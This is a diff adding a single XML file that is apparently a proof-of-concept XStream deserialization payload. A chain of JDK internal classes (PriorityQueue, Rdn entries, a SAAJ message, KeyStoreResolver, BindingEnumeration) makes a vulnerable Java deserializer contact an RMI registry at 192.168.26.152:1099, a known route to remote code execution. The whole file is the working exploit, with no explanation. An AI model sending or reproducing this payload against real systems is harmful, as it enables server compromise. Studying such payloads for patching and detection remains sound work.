@@ -1,0 +1,59 @@
+<java.util.PriorityQueue serialization='custom'>
+  <unserializable-parents/>
+  <java.util.PriorityQueue>
+    <default>
+      <size>2</size>
+    </default>
+    <int>3</int>
+    <javax.naming.ldap.Rdn_-RdnEntry>
+      <type>12345</type>
+      <value class='com.sun.org.apache.xpath.internal.objects.XString'>
+        <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: <none></m__obj>
+      </value>
+    </javax.naming.ldap.Rdn_-RdnEntry>
+    <javax.naming.ldap.Rdn_-RdnEntry>
+      <type>12345</type>
+      <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>
+        <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>
+          <parsedMessage>true</parsedMessage>
+          <soapVersion>SOAP_11</soapVersion>
+          <bodyParts/>
+          <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>
+            <attachmentsInitialized>false</attachmentsInitialized>
+            <multiPart class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>
+              <soapPart/>
+              <mm>
+                <it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>
+                  <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>
+                    <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>
+                      <names>
+                        <string>aa</string>
+                        <string>aa</string>
+                      </names>
+                      <ctx>
+                        <environment/>
+                        <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>
+                          <java.rmi.server.RemoteObject>
+                            <string>UnicastRef</string>
+                            <string>192.168.26.152</string>
+                            <int>1099</int>
+                            <long>0</long>
+                            <int>0</int>
+                            <short>0</short>
+                            <boolean>false</boolean>
+                          </java.rmi.server.RemoteObject>
+                        </registry>
+                        <host>192.168.26.152</host>
+                        <port>1099</port>
+                      </ctx>
+                    </candidates>
+                  </aliases>
+                </it>
+              </mm>
+            </multiPart>
+          </sm>
+        </message>
+      </value>
+    </javax.naming.ldap.Rdn_-RdnEntry>
+  </java.util.PriorityQueue>
+</java.util.PriorityQueue>
